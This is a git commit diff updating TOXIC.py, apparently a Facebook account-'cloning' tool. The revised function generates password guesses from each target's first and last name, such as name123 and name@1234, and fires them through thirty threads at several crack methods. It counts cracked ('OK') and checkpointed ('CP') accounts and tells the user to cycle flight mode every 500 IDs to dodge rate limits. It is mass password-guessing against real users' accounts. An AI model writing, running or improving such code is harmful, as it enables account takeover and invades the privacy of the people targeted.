877380706c4689b19c1fb68d560f5ba083e9e771
SUPRAJ-8 <129602272+SUPRAJ-8@users.noreply.github.com>
2024-04-23 10:09:01 +0545

    Update TOXIC.py

--- TOXIC.py
+++ TOXIC.py
@@ -633,102 +633,90 @@ def setting():
 #-------------------[ BAGIAN-WORDLIST ]------------#
  
 def passwrd():
-    os.system('clear')
-    print(logo)
-    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
-    print('\033[0;97m-----------------------------------------------')
-    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
-    print('\033[0;97m-----------------------------------------------')
-    
-    with tred(max_workers=30) as pool:
-        for yuzong in id2:
-            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
-            pwv = []
-            if len(nmf) < 6:
-                if len(frs) < 3:
-                    pass
-                else:                
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
-                    pwv.append(frs+'@12')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
-                    pwv.append(frs+'@123456')
-                    pwv.append(frs+'@111')
-                    ####$
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
-                    ###
-                    ###
-                    pwv.append(frs+'123@')
-            else:
-                if len(frs) < 3:
-                    pwv.append(nmf)
-                else:
-                   pwv.append(frs+'12')
-                   pwv.append(frs+'123')
-                   pwv.append(frs+'1234')
-                   pwv.append(frs+'12345')
-                   pwv.append(frs+'123456')
-                   pwv.append(nmf)
-                   pwv.append(frs+'@12')
-                   pwv.append(frs+'@123')
-                   pwv.append(frs+'@1234')
-                   pwv.append(frs+'@12345')
-                   ######$$$$
-                   pwv.append(frs+'@111')
-                   #$$$$$###
-                   pwv.append(frs+'@@')
-                   pwv.append(frs+'@@@')
-                   pwv.append(frs+'@1234')
-                   pwv.append(frs+'@12345')
-                   #######
-                   pwv.append(frs+'@#')
-                   pwv.append(frs+'123@')
-                                        
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:
-                pass
-            
-            if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
-            elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackfree, idf, pwv)
-            else:
-                pool.submit(crackfree, idf, pwv)
-    
-    print('\033[0;91m-----------------------------------------------')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
-    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
-    print('\033[0;91m-----------------------------------------------')
-    
-    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python TOXIC.py")
-    exit()
-
-# Define the crack function
-def crack(idf, pwv):
-    # Your implementation of the crack function
-    pass  # Placeholder for the actual implementation
-
-# Add your other variables and functions here if they are defined elsewhere in your code.
-
+	os.system('clear')
+	banner()
+	info()
+	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
+	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
+	linex()
+	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
+	linex()
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			pwv = []
+			frs = nmf.split(' ')[0]
+			try:
+				lst = nmf.split(' ')[1]
+			except:
+				lst = ''
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+lst)
+					pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+					pwv.append(lst+frs)
+					pwv.append(frs+'12')
+					pwv.append(frs+'123')
+					pwv.append(frs+'321')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@1234')
+					pwv.append(frs+lst+'123')
+					pwv.append(frs+lst+'1234')
+					pwv.append(frs+lst+'@123')
+					pwv.append(frs+lst+'@1234')
+					pwv.append(frs+lst+'321')
+					pwv.append(lst+frs+'123')
+					pwv.append(lst+frs+'111')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+lst)
+					pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+					pwv.append(lst+frs)
+					pwv.append(frs+'12')
+					pwv.append(frs+'123')
+					pwv.append(frs+'321')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@1234')
+					pwv.append(frs+lst+'123')
+					pwv.append(frs+lst+'1234')
+					pwv.append(frs+lst+'@123')
+					pwv.append(frs+lst+'@1234')
+					pwv.append(frs+lst+'321')
+					pwv.append(lst+frs+'123')
+					pwv.append(lst+frs+'111')
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'bapi' in method:
+				pool.submit(bapi,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print('\n\x1b[37m----------------------------------------------')
+	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
+	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
+	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
+	linex()
+	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
+	restart()
 #--------------------[ METODE-B-API ]-----------------#
  
 import sys
